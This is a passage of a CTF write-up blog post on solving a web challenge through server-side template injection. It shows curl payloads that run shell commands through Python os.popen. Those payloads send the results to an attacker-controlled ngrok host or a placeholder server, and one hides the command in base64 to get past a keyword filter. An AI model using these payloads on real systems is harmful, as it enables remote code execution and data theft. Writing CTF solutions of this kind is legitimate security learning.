+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://52.59.124.14:5011/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${__import__(&#39;os&#39;).popen(&#39;curl https://c590-2-37-206-147.ngrok-free.app?content=\$(id)&#39;).read()}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>$(command)</code> in bash allows executing commands and printing the output inside strings. This is the result:</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png" title="Curl 6" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png" data-sub-html="<h2>Curl 6</h2><p>Curl 6</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png" />
+    </a><figcaption class="image-caption">Curl 6</figcaption>
+    </figure></p>
+<p>As we can see, I obtain the response on my web server, but let&rsquo;s check if the output of the <code>id</code> command executed on the web server is in the <code>content</code> request parameter. This can be done through the ngrok web interface at <a href="http://127.0.0.1:4040" target="_blank" rel="noopener noreffer ">http://127.0.0.1:4040</a>.</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png" title="&amp;lsquo;id&amp;rsquo; Execution" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png" data-sub-html="<h2>&#39;id&#39; Execution</h2><p>&amp;lsquo;id&amp;rsquo; Execution</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png" />
+    </a><figcaption class="image-caption">'id' Execution</figcaption>
+    </figure></p>
+<p>As we can see from the last request, the <code>content</code> parameter contains the value <code>uid=999(appuser)</code>, which is the user ID with which we executed the command. So it works! Now, we just need to proceed with the actual exploitation and read the <code>/tmp/flag.txt</code> file.</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<blockquote>
+<p>For the exploitation, we can&rsquo;t send a direct request with <code>cat /tmp/flag.txt</code> because the server blocks the request before reaching the template injection part if it finds <code>flag</code> in the request. So, I thought of encoding the command in base64:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;cat /tmp/flag.txt&#34;</span> <span class="p">|</span> base64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png" title="Base64 Encode" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png" data-sub-html="<h2>Base64 Encode</h2><p>Base64 Encode</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png" />
+    </a><figcaption class="image-caption">Base64 Encode</figcaption>
+    </figure></p>
+<p>Once the command is encoded, we can use a simple bash trick, the pipe <code>|</code>, to concatenate commands and execute the base64-decoded command on bash itself. We can do this by running <code>echo Y2F0IC90bXAvZmxhZy50eHQK | base64 -d | bash</code>. As we can see, this command executes <code>cat /tmp/flag.txt</code>:</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png" title="Cat Flag" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png" data-sub-html="<h2>Cat Flag</h2><p>Cat Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png" />
+    </a><figcaption class="image-caption">Cat Flag</figcaption>
+    </figure></p>
+<p>Once that&rsquo;s done, since we are sending a base64-encoded string in the request, the check won&rsquo;t block it because <code>&quot;Y2F0IC90bXAvZmxhZy50eHQK&quot; != &quot;flag&quot;</code>. However, once it reaches the web server, the actual command will be executed. I then construct the complete request with curl:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://52.59.124.14:5011/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${__import__(&#39;os&#39;).popen(&#39;curl https://9791-2-37-206-147.ngrok-free.app?content=\$(echo Y2F0IC90bXAvZmxhZy50eHQK| base64 -d |bash)&#39;).read()}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png" title="Exploitation" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png" data-sub-html="<h2>Exploitation</h2><p>Exploitation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png" />
+    </a><figcaption class="image-caption">Exploitation</figcaption>
+    </figure></p>
+<p>And as we can see, the request reaches the <code>ngrok</code> web server. Now, we just need to check on the ngrok web interface to see if the output of the <code>cat /tmp/flag.txt</code> command (i.e., the actual flag) is in the <code>content</code> parameter. Another valid and much more elegant exploit, after speaking with a guy from my team, is the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://52.59.124.14:5011/ --data <span class="s2">&#34;temptation=\${__import__(&#39;os&#39;).popen(&#39;curl -X POST https://your-server.com --data-binary @/etc/flag.txt&#39;).read()}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<h3 id="flag-capture">Flag capture</h3>
+<blockquote>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png" title="Manual Flag" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png" data-sub-html="<h2>Manual Flag</h2><p>Manual Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png" />
+    </a><figcaption class="image-caption">Manual Flag</figcaption>
+    </figure>
+(The flag does not display the <code>{}</code> brackets due to an encoding or decoding issue with ngrok. You just need to add one bracket at the end and one after <code>ENO</code> to recreate the flag pattern and have a valid flag.)</p>
+</blockquote>
+<h1 id="-exploitation-process">🛠️ Exploitation Process</h1>
+<h2 id="approach">Approach</h2>
+<blockquote>
+<p>The exploit I created is fully automated and performs the procedure described above. However, there are some prerequisites. First, ngrok needs to be started:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ngrok http <span class="m">4444</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If necessary, the port in <code>exploit.py</code> should be changed to match the tunneling port of ngrok. After starting ngrok, take the tunneling link provided by ngrok and replace the link in the <code>request.py</code> script. At this point, you just need to run the exploit first, followed by the request, either in separate terminals or on the same terminal, possibly using tmux.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exploit.py
+</span></span><span class="line"><span class="cl">python request.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>exploit.py</code> is a Python web server that runs locally, and with ngrok tunneling, it forwards the port. So once the request with the payload is sent, the response will first go to <code>ngrok</code> and then to the local Python server. Upon receiving the request, I extract the <code>content</code> parameter, format the flag by adding <code>{}</code> as mentioned earlier, and then print it:</p>
+<ul>
+<li><a href="/resources/NullCon-Goa-HackIM-CTF-2025/Temptation/exploit.py" rel=""><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;Exploit</a></li>
+</ul>
+<blockquote>
+<ul>
+<li><a href="/resources/NullCon-Goa-HackIM-CTF-2025/Temptation/request.py" rel=""><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;Request</a></li>
+</ul>
+</blockquote>
+</blockquote>
+<h1 id="-flag-capture">🚩 Flag Capture</h1>
+<blockquote>
+<div class="details admonition danger open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-skull-crossbones fa-fw" aria-hidden="true"></i>Flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="typeit"><h4 id="id-1"></h4></div>
+<blockquote>
+</blockquote>
+</div>
+        </div>
+    </div>
+</blockquote>
+<h2 id="proof-of-execution">Proof of Execution</h2>
+<blockquote>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png" title="Automated Flag" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png" data-sub-html="<h2>Automated Flag</h2><p>Automated Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png" />
+    </a><figcaption class="image-caption">Automated Flag</figcaption>
+    </figure>
+<em>Screenshot of successful exploitation</em></p>
+</blockquote>
+<h1 id="-tools-used">🔧 Tools Used</h1>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Python</td>
+<td>Exploit</td>
+</tr>
+<tr>
+<td>Ngrok</td>
+<td>Tunneling</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h1 id="-key-learnings">💡 Key Learnings</h1>
+<h2 id="new-knowledge">New Knowledge</h2>
+<blockquote>
+<p>I learned to exploit SSTI by passing a command and returning the output to my ngrok webserver.</p>
+</blockquote>
+<h2 id="skills-improved">Skills Improved</h2>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Binary Exploitation</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Reverse Engineering</li>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> Web Exploitation</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Cryptography</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Forensics</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> OSINT</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Miscellaneous</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="-final-statistics">📊 Final Statistics</h1>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Time to Solve</td>
+<td>01:30</td>
+<td>From start to flag</td>
+</tr>
+<tr>
+<td>Global Ranking (At the time of flag submission)</td>
+<td>26/970</td>
+<td>Challenge ranking</td>
+</tr>
+<tr>
+<td>Points Earned</td>
+<td>500</td>
+<td>Team contribution</td>
+</tr>
+</tbody>
+</table>
+<p><em>Created: 01-02-2025 • Last Modified: 01-02-2025</em>
+<em>Author: mH4ck3r0n3 • Team: QnQSec</em></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 07/02/2025</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2025/02/07/temptation/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" data-title="🌐 Temptation" data-hashtags="💉 SSTI (Server Side Template Injection),🌐 Web Security"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" data-hashtag="💉 SSTI (Server Side Template Injection)"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" data-title="🌐 Temptation" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" data-title="🌐 Temptation"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" data-title="🌐 Temptation"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" data-title="🌐 Temptation"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ssti-server-side-template-injection/">💉 SSTI (Server Side Template Injection)</a>,&nbsp;<a href="/tags/web-security/">🌐 Web Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+
+    <div class="post-nav"><a href="/posts/2025/02/07/sess.io/" class="prev" rel="prev" title="🌐 Sess.io"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>🌐 Sess.io</a></div>
+</div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://mh4ck3r0n3.github.io/" target="_blank">mH4ck3r0n3</a></span>&nbsp;|&nbsp;<span class="license"><a rel="This is free and unencumbered software released into the public domain." href="https://unlicense.org" target="_blank">The Unlicense</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"ENO{T3M_Pl4T_3S_4r3_S3cUre!!}","id-2":"mH4ck3r0n3","id-3":"mH4ck3r0n3"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"RYTH4NIP8Z","algoliaIndex":"mh4ck3r0n3_github_io_ryth4nip8z_articles","algoliaSearchKey":"5288bb44022269be805c2b51c80976df","highlightTag":"em","maxResultLength":6,"noResultsFound":"No results found","snippetLength":100,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"],"id-3":["id-3"]},"duration":-1,"speed":70}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-597RCC8B41', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-597RCC8B41" async></script></body>
+</html>
